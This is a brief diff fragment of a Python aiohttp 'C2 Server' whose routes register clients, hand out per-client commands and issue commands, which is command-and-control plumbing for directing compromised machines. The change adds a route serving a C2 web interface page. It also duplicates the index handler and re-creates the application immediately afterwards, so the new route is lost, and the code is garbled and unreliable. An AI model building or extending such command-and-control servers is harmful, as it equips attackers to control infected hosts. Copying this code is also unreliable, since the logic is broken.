@@ -66,6 +66,13 @@ async def issue_command(request):
 async def index(request):
     return web.Response(text="C2 Server Running", content_type="json") #text/html
 
+async def index(request):
+    return web.FileResponse("c2_webInterface.html")
+
+app = web.Application()
+app.router.add_get("/", index)
+
+
 app = web.Application()
 app.router.add_post("/register", register_client)  
 app.router.add_get("/command/{client_id}", get_command)  
